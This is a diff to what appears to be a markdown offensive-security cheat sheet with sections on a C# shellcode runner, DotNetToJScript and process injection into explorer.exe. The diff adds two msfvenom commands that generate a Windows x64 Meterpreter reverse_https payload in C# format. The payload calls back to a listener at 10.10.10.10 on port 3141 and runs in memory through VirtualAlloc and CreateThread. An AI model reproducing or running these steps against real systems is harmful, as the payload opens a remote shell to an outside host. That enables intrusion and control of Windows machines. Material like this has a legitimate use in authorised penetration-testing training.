@@ -1528,10 +1528,17 @@ namespace ConsoleApp1
 
 **Shellcode Runner in C#:**
 
+
 <details>
   <summary>Expand</summary>
 
 We combine VirtualAlloc, CreateThread, and WaitForSingleObject to execute shellcode in memory
+
+Generate shellcode:
+
+```
+sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.10.10 LPORT=3141 -f csharp
+```
 
 ```csharp
 using System;
@@ -1641,6 +1648,11 @@ DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o runner.js
 
 ## Process Injection in C#
 Create 64-bit meterpreter staged shellcode with msfvenom in csharp format.
+```
+sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.10.10 LPORT=3141 -f csharp
+```
+
+
 Open Visual Studio and create a .NET standard Console App.
 Note: 4804 is the process ID of exporer.exe but this changes after each login and varies by machine. Get the ID through Process Explorer (SysInternals)
 ```
